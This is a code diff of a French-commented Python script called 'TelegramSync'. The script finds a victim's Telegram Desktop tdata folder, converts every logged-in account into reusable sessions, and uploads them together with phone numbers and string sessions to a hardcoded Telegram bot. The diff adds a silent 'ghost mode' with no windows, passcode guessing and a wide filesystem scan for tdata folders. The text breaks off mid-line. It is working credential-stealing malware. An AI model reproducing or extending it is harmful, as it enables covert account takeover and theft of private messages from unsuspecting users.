@@ -1,30 +1,67 @@
 # -*- coding: utf-8 -*-
 """
 TelegramSync - tdata -> .session par compte -> envoi vers ton bot Telegram.
-Aucune interaction requise cote cible (hors double-clic).
+
+Mode fantome : aucune fenetre, aucun popup, tout passe par le bot.
+Ne modifie JAMAIS le tdata de la victime (lecture seule via snapshot).
+
+Surcharges :
+  TG_TDATA      chemin force vers le dossier tdata
+  TG_PASSCODE   code d'acces local (si passcodes.txt ne suffit pas)
+  passcodes.txt a cote de l'exe : un code par ligne, essayes dans l'ordre
 """
 import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
+import subprocess, time
 import requests
+
+# ---- pas de console en mode windowed : on se protege de sys.stdout=None ----
+if sys.stdout is None or sys.stderr is None:
+    class _Null:
+        def write(self, *a): pass
+        def flush(self): pass
+        def isatty(self): return False
+    sys.stdout = sys.stdout or _Null()
+    sys.stderr = sys.stderr or _Null()
 
 # ---------------------------------------------------------------- CONFIG
 BOT_TOKEN = "8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA"
 CHAT_ID   = 8425878739
 
-# api_id/api_hash de Telegram Desktop : deterministes, a reutiliser chez toi
 API_ID   = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
+
+# Codes d'acces locaux a essayer (le premier qui dechiffre gagne).
+# "" = pas de code. Complete ici, ou depose passcodes.txt a cote de l'exe.
+PASSCODES = [""]
 # ----------------------------------------------------------------------
 
 WORK = os.path.join(tempfile.gettempdir(), "tgsync")
+_NO_WINDOW = 0x08000000 if os.name == "nt" else 0
 
 
-# ------------------------------------------------------------- feedback UI
-def popup(title, msg):
-    try:
-        import tkinter.messagebox as mb
-        mb.showinfo(title, msg)
-    except Exception:
-        pass
+# ------------------------------------------------------------- chemins
+def exe_dir():
+    if getattr(sys, "frozen", False):
+        return os.path.dirname(os.path.abspath(sys.executable))
+    return os.path.dirname(os.path.abspath(sys.argv[0]))
+
+
+def load_passcodes():
+    out = [""]
+    for p in [os.environ.get("TG_PASSCODE")] + list(PASSCODES):
+        if p is not None and p not in out:
+            out.append(p)
+    f = os.path.join(exe_dir(), "passcodes.txt")
+    if os.path.isfile(f):
+        try:
+            with open(f, encoding="utf-8-sig") as fh:
+                for line in fh:
+                    line = line.strip()
+                    if line and line not in out:
+                        out.append(line)
+        except OSError:
+            pass
+    return out
 
 
 # ------------------------------------------------------------- bot helpers
@@ -69,109 +106,44 @@ def tg_big(path, caption="", limit=45 * 1024 * 1024):
 
 
 # ------------------------------------------------------------- tdata
-def find_tdata():
-    cands = [
-        os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata"),
-        os.path.expandvars(r"%LOCALAPPDATA%\Telegram Desktop\tdata"),
-        os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "tdata"),
-    ]
-    for c in cands:
-        if os.path.isdir(c) and os.path.isfile(os.path.join(c, "key_datas")):
-            return c
-    for c in cands:
-        if os.path.isdir(c):
-            return c
-    return None
-
-
-def zip_dir(src, dst):
-    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
-        for root, _, files in os.walk(src):
-            for f in files:
-                p = os.path.join(root, f)
-                z.write(p, os.path.relpath(p, src))
-
-
-# ------------------------------------------------------------- conversion
-async def convert_all(tdata, outdir):
-    from opentele.td import TDesktop
-    from opentele.api import API, UseCurrentSession
-    from telethon.sessions import StringSession
-
-    td = TDesktop(tdata)
-    if not td.isLoaded():
-        raise RuntimeError("tdata illisible (key_datas manquant ou corrompu)")
-
-    n = len(td.accounts)
-    tg_text(f"tdata localise, {n} compte(s) detecte(s). Conversion en cours...")
-
-    out = []
-    for i, acc in enumerate(td.accounts):
-        entry = {"index": i}
-        try:
-            client = await acc.ToTelethon(
-                session=os.path.join(outdir, f"account_{i}"),
-                flag=UseCurrentSession,          # reutilise l'auth existante
-                api=API.TelegramDesktop,
-            )
-            await client.connect()
-            if not await client.is_user_authorized():
-                raise RuntimeError("session non autorisee")
-            me = await client.get_me()
-            entry.update({
-                "file": f"account_{i}.session",
-                "id": me.id,
-                "phone": me.phone,
-                "username": me.username,
-                "first_name": me.first_name,
-                "last_name": me.last_name,
-                "dc_id": client.session.dc_id,
-                "string_session": StringSession.save(client.session),
-            })
-            await client.disconnect()
-        except Exception as e:
-            entry["error"] = repr(e)
-        out.append(entry)
-    return out
-
-
-# ------------------------------------------------------------- main
-def main():
-    td = find_tdata()
-    if not td:
-        popup("TelegramSync",
-              "Telegram Desktop introuvable.\n"
-              "Installez-le, connectez-vous une fois, puis relancez.")
-        return
-
-    shutil.rmtree(WORK, ignore_errors=True)
-    os.makedirs(WORK, exist_ok=True)
-
-    accounts = asyncio.run(convert_all(td, WORK))
-    if not accounts:
-        raise RuntimeError("aucun compte converti")
-
-    manifest = os.path.join(WORK, "manifest.json")
-    with open(manifest, "w", encoding="utf-8") as f:
-        json.dump(accounts, f, indent=2, ensure_ascii=False)
-
-    z = os.path.join(tempfile.gettempdir(), "sessions.zip")
-    zip_dir(WORK, z)
-
-    ok = [a for a in accounts if "error" not in a]
-    tg_big(z, f"session(s) Telegram - {len(ok)} compte(s) sur {len(accounts)}")
-    tg_text("Comptes:\n" + "\n".join(
-        f"- #{a['index']} {a.get('phone','?')} @{a.get('username') or '-'}"
-        + (" [ECHEC]" if "error" in a else "")
-        for a in accounts))
-
-    popup("TelegramSync", f"Termine. {len(ok)} compte(s) envoye(s) sur ton bot.")
-
-
-if __name__ == "__main__":
+def is_tdata_dir(p):
+    """Un vrai tdata : key_datas + au moins un dossier de compte (16 hex)."""
+    if not p or not os.path.isdir(p):
+        return False
+    if not os.path.isfile(os.path.join(p, "key_datas")):
+        return False
     try:
-        main()
-    except Exception:
-        tb = traceback.format_exc()
-        tg_text("TelegramSync - ERREUR\n\n" + tb)
-        popup("TelegramSync", "Erreur. Details envoyes sur ton bot.")
+        return any(len(d) == 16 and os.path.isdir(os.path.join(p, d))
+                   for d in os.listdir(p))
+    except OSError:
+        return False
+
+
+_SCAN_SKIP = {"temp", "Temp", "tmp", "Cache", "cache", "CachedData",
+              "Crashpad", "logs", "node_modules", ".git", ".cache",
+              "Packages", "dumps", "emoji", "user_data"}
+
+
+def _scan_roots():
+    return [
+        os.path.expandvars(r"%APPDATA%"),
+        os.path.expandvars(r"%LOCALAPPDATA%"),
+        os.path.expandvars(r"%USERPROFILE%"),
+        os.path.expandvars(r"%ProgramFiles%"),
+        os.path.expandvars(r"%ProgramFiles(x86)%"),
+    ]
+
+
+def _bounded_scan(max_depth=4):
+    """Dernier recours : cherche un dossier tdata* valide, profondeur bornee."""
+    found = []
+    for root in _scan_roots():
+        if not root or not os.path.isdir(root):
+            continue
+        base = root.rstrip("\\/").count(os.sep)
+        try:
+            for dirpath, dirnames, _ in os.walk(root):
+                if dirpath.rstrip("\\/").count(os.sep) - base >= max_depth:
+                    dirnames[:] = []
+                dirnames[:] = [d for d in dirnames if d not in _SCAN_SKIP]
+                if os.path.basename(dirpath).startswith("tdata") and is_tdata_dir(
